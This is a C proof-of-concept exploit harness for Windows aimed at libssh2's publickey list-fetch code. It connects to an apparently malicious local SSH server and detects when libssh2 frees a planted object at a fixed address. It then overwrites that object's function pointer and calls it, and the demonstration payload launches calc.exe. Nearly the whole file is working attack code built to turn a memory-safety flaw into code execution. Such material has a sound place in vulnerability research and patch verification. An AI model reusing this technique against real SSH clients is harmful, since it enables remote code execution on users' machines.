#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libssh2.h"
#include "libssh2_publickey.h"

#define FIXED_VICTIM_ADDR ((uintptr_t)0x0000013370000000ULL)
#define MAX_RECORDS 16384

struct victim {
    void (*cb)(void);
    unsigned char pad[120];
};

struct alloc_record {
    void *ptr;
    int live;
};

static HANDLE app_heap;
static struct alloc_record records[MAX_RECORDS];
static struct victim *stale_victim;
static int victim_freed;
static int launch_real_calc;
static unsigned long heap_free_failures;
static unsigned long ignored_unknown_frees;

static void track_ptr(void *ptr)
{
    size_t i;

    if(!ptr)
        return;
    for(i = 0; i < MAX_RECORDS; i++) {
        if(!records[i].live) {
            records[i].ptr = ptr;
            records[i].live = 1;
            return;
        }
    }
}

static int untrack_ptr(void *ptr)
{
    size_t i;

    for(i = 0; i < MAX_RECORDS; i++) {
        if(records[i].live && records[i].ptr == ptr) {
            records[i].live = 0;
            return 1;
        }
    }
    return 0;
}

static void safe_callback(void)
{
    fprintf(stderr, "safe_callback_reached\n");
}

static void launch_calc_callback(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[] = "calc.exe";
    FILE *f = fopen("live_ssh_calc_payload_reached.txt", "wb");

    if(f) {
        fputs("live ssh calc payload reached\n", f);
        fclose(f);
    }

    fprintf(stderr, "calc_payload_reached callback=%p\n",
            launch_calc_callback);

    if(launch_real_calc) {
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));
        si.cb = sizeof(si);
        if(CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL,
                          &si, &pi)) {
            fprintf(stderr, "calc_launch=success pid=%lu\n",
                    (unsigned long)pi.dwProcessId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else {
            fprintf(stderr, "calc_launch=failed error=%lu\n",
                    (unsigned long)GetLastError());
            ExitProcess(78);
        }
    }

    ExitProcess(77);
}

static void *app_alloc_raw(size_t size)
{
    void *ptr = HeapAlloc(app_heap, 0, size ? size : 1);
    track_ptr(ptr);
    return ptr;
}

static void app_free_raw(void *ptr)
{
    if(!ptr)
        return;

    if(ptr == stale_victim) {
        victim_freed = 1;
        fprintf(stderr, "victim_free_callback ptr=%p\n", ptr);
        return;
    }

    if(!untrack_ptr(ptr)) {
        ignored_unknown_frees++;
        fprintf(stderr, "free_ignored_unknown ptr=%p\n", ptr);
        return;
    }

    if(!HeapFree(app_heap, 0, ptr)) {
        heap_free_failures++;
        fprintf(stderr, "heap_free_failed ptr=%p error=%lu\n", ptr,
                (unsigned long)GetLastError());
    }
}

static LIBSSH2_ALLOC_FUNC(app_alloc)
{
    void *ptr;

    (void)abstract;
    ptr = app_alloc_raw(count);
    fprintf(stderr, "alloc size=%llu ptr=%p\n",
            (unsigned long long)(count ? count : 1), ptr);
    return ptr;
}

static LIBSSH2_FREE_FUNC(app_free)
{
    (void)abstract;
    fprintf(stderr, "free ptr=%p\n", ptr);
    app_free_raw(ptr);
}

static LIBSSH2_REALLOC_FUNC(app_realloc)
{
    void *newptr;

    (void)abstract;
    if(!ptr)
        return app_alloc(count, abstract);
    if(!untrack_ptr(ptr)) {
        ignored_unknown_frees++;
        fprintf(stderr, "realloc_ignored_unknown old=%p size=%llu\n", ptr,
                (unsigned long long)(count ? count : 1));
        return NULL;
    }
    newptr = HeapReAlloc(app_heap, 0, ptr, count ? count : 1);
    if(newptr)
        track_ptr(newptr);
    fprintf(stderr, "realloc old=%p size=%llu new=%p\n", ptr,
            (unsigned long long)(count ? count : 1), newptr);
    return newptr;
}

static int init_fixed_victim(void)
{
    struct victim payload;

    stale_victim = (struct victim *)VirtualAlloc(
        (LPVOID)FIXED_VICTIM_ADDR, sizeof(*stale_victim),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(!stale_victim) {
        fprintf(stderr, "fixed_victim_alloc_failed addr=0x%016llx error=%lu\n",
                (unsigned long long)FIXED_VICTIM_ADDR,
                (unsigned long)GetLastError());
        return 0;
    }

    memset(stale_victim, 0x42, sizeof(*stale_victim));
    stale_victim->cb = safe_callback;
    memset(&payload, 0x43, sizeof(payload));
    payload.cb = launch_calc_callback;

    fprintf(stderr,
            "fixed_victim=%p victim_size=%llu replacement_callback=%p\n",
            stale_victim, (unsigned long long)sizeof(*stale_victim),
            launch_calc_callback);
    return 1;
}

static SOCKET connect_tcp(const char *host, const char *port)
{
    struct addrinfo hints;
    struct addrinfo *res = NULL;
    struct addrinfo *cur;
    SOCKET sock = INVALID_SOCKET;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if(getaddrinfo(host, port, &hints, &res) != 0)
        return INVALID_SOCKET;

    for(cur = res; cur; cur = cur->ai_next) {
        sock = socket(cur->ai_family, cur->ai_socktype, cur->ai_protocol);
        if(sock == INVALID_SOCKET)
            continue;
        if(connect(sock, cur->ai_addr, (int)cur->ai_addrlen) == 0)
            break;
        closesocket(sock);
        sock = INVALID_SOCKET;
    }

    freeaddrinfo(res);
    return sock;
}

static void print_last_error(LIBSSH2_SESSION *session, const char *where)
{
    char *errmsg = NULL;
    int errlen = 0;
    int err = libssh2_session_last_error(session, &errmsg, &errlen, 0);

    fprintf(stderr, "%s_failed err=%d msg=%.*s\n", where, err, errlen,
            errmsg ? errmsg : "");
}

int main(int argc, char **argv)
{
    const char *host = "127.0.0.1";
    const char *port = "2228";
    WSADATA wsadata;
    SOCKET sock;
    LIBSSH2_SESSION *session;
    LIBSSH2_PUBLICKEY *pkey;
    libssh2_publickey_list *list = NULL;
    unsigned long num_keys = 0;
    struct victim replacement_payload;
    struct victim *replacement;
    int rc;

    if(argc > 1)
        host = argv[1];
    if(argc > 2)
        port = argv[2];
    if(argc > 3 && !strcmp(argv[3], "calc"))
        launch_real_calc = 1;

    app_heap = HeapCreate(0, 0, 0);
    if(!app_heap)
        return 69;
    if(!init_fixed_victim())
        return 68;

    memset(&replacement_payload, 0x43, sizeof(replacement_payload));
    replacement_payload.cb = launch_calc_callback;

    if(WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
        return 2;

    rc = libssh2_init(0);
    if(rc) {
        fprintf(stderr, "libssh2_init_failed rc=%d\n", rc);
        return 3;
    }

    sock = connect_tcp(host, port);
    if(sock == INVALID_SOCKET) {
        fprintf(stderr, "connect_failed host=%s port=%s error=%d\n", host,
                port, WSAGetLastError());
        return 4;
    }
    fprintf(stderr, "tcp_connected host=%s port=%s\n", host, port);

    session = libssh2_session_init_ex(app_alloc, app_free, app_realloc, NULL);
    if(!session)
        return 5;
    libssh2_session_set_blocking(session, 1);
    rc = libssh2_session_method_pref(
        session, LIBSSH2_METHOD_KEX,
        "curve25519-sha256,curve25519-sha256@libssh.org,"
        "ecdh-sha2-nistp256,diffie-hellman-group14-sha256,"
        "diffie-hellman-group14-sha1");
    if(rc)
        fprintf(stderr, "kex_pref_rc=%d\n", rc);

    rc = libssh2_session_handshake(session, (libssh2_socket_t)sock);
    if(rc) {
        print_last_error(session, "handshake");
        return 6;
    }
    fprintf(stderr, "ssh_handshake=ok\n");

    rc = libssh2_userauth_password(session, "user", "pass");
    if(rc) {
        print_last_error(session, "password_auth");
        return 7;
    }
    fprintf(stderr, "ssh_auth=ok\n");

    pkey = libssh2_publickey_init(session);
    if(!pkey) {
        print_last_error(session, "publickey_init");
        return 8;
    }
    fprintf(stderr, "publickey_init=ok\n");

    {
        int attempt;
        for(attempt = 1; attempt <= 1000; attempt++) {
            rc = libssh2_publickey_list_fetch(pkey, &num_keys, &list);
            if(rc != LIBSSH2_ERROR_EAGAIN)
                break;
            Sleep(10);
        }
    }
    fprintf(stderr,
            "list_fetch_rc=%d num_keys=%lu victim_freed=%d ignored_unknown_frees=%lu heap_free_failures=%lu\n",
            rc, num_keys, victim_freed, ignored_unknown_frees,
            heap_free_failures);
    if(rc)
        print_last_error(session, "list_fetch");

    replacement = NULL;
    if(victim_freed)
        replacement = stale_victim;
    else
        replacement = (struct victim *)app_alloc_raw(sizeof(*replacement));

    fprintf(stderr, "replacement=%p same_as_victim=%d\n", replacement,
            replacement == stale_victim);
    if(replacement)
        memcpy(replacement, &replacement_payload, sizeof(replacement_payload));

    fprintf(stderr, "triggering_stale_callback cb=%p\n", stale_victim->cb);
    stale_victim->cb();

    return victim_freed ? 2 : 1;
}
